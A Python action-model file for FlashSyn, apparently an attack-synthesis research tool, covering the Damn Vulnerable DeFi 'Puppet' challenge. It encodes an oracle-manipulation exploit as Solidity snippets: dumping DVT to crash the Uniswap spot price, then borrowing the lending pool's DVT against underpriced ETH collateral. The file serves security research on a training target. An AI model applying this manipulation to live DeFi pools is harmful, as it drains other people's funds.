"""FlashSyn action model for Damn Vulnerable DeFi — Puppet (V1).

A Python model (not a manifest) because the pool's `borrow` inverts the manifest's
fixed assumption that the consumed `tokens_in` amount IS the search parameter and the
produced `tokens_out` amount is the approximation. For borrow it is the other way
round: you CHOOSE how much DVT to borrow (the parameter, received) and PAY an ETH
collateral that is an approximated function of the manipulated Uniswap spot price
(the consumed amount). So PoolBorrow overrides transit() and collectorStr(); the two
swaps keep ActionPro's defaults for transit and only override collectorStr because
they move native ETH (no balanceOf()).

Run it (from the repo root):
    python3 flashsyn.py compile    puppet
    python3 flashsyn.py collect    puppet
    python3 flashsyn.py synthesize puppet > run.log
"""
import sys
import os
import config

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
sys.path.append(os.path.dirname(SCRIPT_DIR))
sys.path.append(os.path.dirname(os.path.dirname(SCRIPT_DIR)))

from Actions.macros import *
from Actions.UtilsPrecision import *
from Actions.AttackDAG import *
from FlashSynProActions.ActionPro import *


class puppetAction(ActionPro):
    # Attacker starts with 1000 DVT and 25 ETH — must match setUp() in attack.t.sol.
    initialBalances = {"DVT": 1000, "ETH": 25}
    currentBalances = initialBalances.copy()      # Don't change

    # Profit weighs ETH at 1000 and DVT at 1 (same relative scale as the DVD challenge).
    TokenPrices = {"ETH": 1000.0, "DVT": 1.0}
    TargetTokens = TokenPrices.keys()             # Don't change

    # Unused by these actions (every collectorStr is overridden below), kept for the
    # DVT ERC20 metadata should a default collector ever be reintroduced.
    tokenInfo = {"DVT": ("dvt", 18)}

    # No start_str literal: the engine reads the harness preamble from attack.t.sol
    # (single source of truth), as the manifest examples do.

    def calcProfit(stats):
        # stats = [DVT balance, ETH balance] from profitSummary(), in whole tokens.
        if stats is None or len(stats) != 2:
            return 0
        dvt_earned = stats[0] - puppetAction.initialBalances["DVT"]
        eth_earned = stats[1] - puppetAction.initialBalances["ETH"]
        return dvt_earned * 1.0 + eth_earned * 1000.0


class SwapUniswapDVT2ETH(puppetAction):
    """Dump DVT into the tiny Uniswap V1 exchange — this is what crashes the oracle."""
    approximators = NumericalApproximatorsPro()
    numInputs = 1
    tokensIn = ["DVT"]
    tokensOut = ["ETH"]
    range = [0, 1000]     # can't sell more DVT than the attacker holds

    @classmethod
    def actionStr(cls):
        return "        // Action: SwapUniswapDVT2ETH\n" \
               "        uniswapExchange.tokenToEthSwapInput($$ * 1e18, 1, 0xffffffff);\n"

    @classmethod
    def collectorStr(cls):
        # Measure native-ETH gained (no balanceOf on ETH -> can't use the default).
        return "        // Collect: SwapUniswapDVT2ETH\n" \
               "        uint _eth0 = address(attacker).balance;\n" \
               "        uniswapExchange.tokenToEthSwapInput($$ * 1e18, 1, 0xffffffff);\n" \
               "        revert(Strings.append(\"FlashSyn: \", (address(attacker).balance - _eth0) / 1e18));\n"

    # transit: default (DVT -= param; ETH += approximated ETH-out).


class SwapUniswapETH2DVT(puppetAction):
    """Buy DVT back with ETH (the reverse leg; lets the search restore/re-manipulate)."""
    approximators = NumericalApproximatorsPro()
    numInputs = 1
    tokensIn = ["ETH"]
    tokensOut = ["DVT"]
    range = [0, 25]

    @classmethod
    def actionStr(cls):
        return "        // Action: SwapUniswapETH2DVT\n" \
               "        uniswapExchange.ethToTokenSwapInput{value: $$ * 1e18}(1, 0xffffffff);\n"

    @classmethod
    def collectorStr(cls):
        return "        // Collect: SwapUniswapETH2DVT\n" \
               "        uint _dvt0 = dvt.balanceOf(address(attacker));\n" \
               "        uniswapExchange.ethToTokenSwapInput{value: $$ * 1e18}(1, 0xffffffff);\n" \
               "        revert(Strings.append(\"FlashSyn: \", (dvt.balanceOf(address(attacker)) - _dvt0) / 1e18));\n"

    # transit: default (ETH -= param; DVT += approximated DVT-out).


class PoolBorrow(puppetAction):
    """Borrow DVT from the pool. Collateral (ETH) is a function of the manipulated
    oracle, so it must be APPROXIMATED — the escape hatch the manifest can't express."""
    approximators = NumericalApproximatorsPro()
    numInputs = 1
    tokensIn = ["ETH"]     # collateral paid (approximated), not a search param
    tokensOut = ["DVT"]    # borrowed amount == the search param
    range = [0, 100000]    # up to the pool's whole 100k DVT reserve

    @classmethod
    def actionStr(cls):
        return "        // Action: PoolBorrow\n" \
               "        _amt = $$ * 1e18;\n" \
               "        _dep = puppetPool.calculateDepositRequired(_amt);\n" \
               "        puppetPool.borrow{value: _dep}(_amt);\n"

    @classmethod
    def collectorStr(cls):
        # Measure the ETH collateral spent (the approximated quantity).
        return "        // Collect: PoolBorrow\n" \
               "        _amt = $$ * 1e18;\n" \
               "        _dep = puppetPool.calculateDepositRequired(_amt);\n" \
               "        puppetPool.borrow{value: _dep}(_amt);\n" \
               "        revert(Strings.append(\"FlashSyn: \", _dep / 1e18));\n"

    @classmethod
    def transit(cls, inputs, actionList):
        # DVT received is the parameter itself; ETH collateral is the approximation.
        cls.currentBalances["DVT"] = cls.currentBalances.get("DVT", 0) + inputs[-1]
        eth_spent = cls.simulate(inputs, actionList)[0]
        cls.currentBalances["ETH"] = cls.currentBalances.get("ETH", 0) - eth_spent


def flashsyn_setup():
    """Return {wrapper, actions, dependencies, max_len} for flashsyn.py, and set the
    forge run command. The scenario is deployed locally in setUp(), so the fork block
    is arbitrary (any archive block the RPC serves)."""
    config.ExecutionMode = DVD
    config.command = "./run.sh Puppet ETH 16818064"
    config.benchmarkName = "puppet"

    actions = [SwapUniswapDVT2ETH, SwapUniswapETH2DVT, PoolBorrow]
    # Safe default: any action's prestate may be reached by running all the others.
    dependencies = [[b for b in actions if b is not a] + [a] for a in actions]
    attackDAGGenerator.setActionDependency(generateActionDependency(actions, dependencies))

    return {"wrapper": puppetAction, "actions": actions,
            "dependencies": dependencies, "max_len": 3}
